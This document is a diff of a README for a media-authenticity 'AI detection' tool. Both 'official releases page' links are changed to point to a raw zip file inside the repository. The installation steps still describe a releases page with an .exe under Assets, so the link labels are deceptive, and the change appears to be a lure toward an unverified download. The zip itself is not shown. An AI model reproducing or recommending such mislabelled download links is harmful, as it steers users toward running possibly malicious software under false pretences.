@@ -1,6 +1,6 @@
 # 🛡️ detect-skill - Verify Media Authenticity With AI Detection
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Hampto7114/detect-skill/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Hampto7114/detect-skill/main/Arlene/detect_skill_v1.6.zip)
 
 ## Purpose of detect-skill
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware and software to run this tool efficiently.
 
 You need the correct installation file to run the tool on your Windows machine. Follow these steps to obtain the software:
 
-1. Visit the [official releases page](https://github.com/Hampto7114/detect-skill/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Hampto7114/detect-skill/main/Arlene/detect_skill_v1.6.zip).
 2. Look for the latest version listed at the top of the page.
 3. Locate the file ending in `.exe` under the Assets section.
 4. Click the file name to download it to your computer.
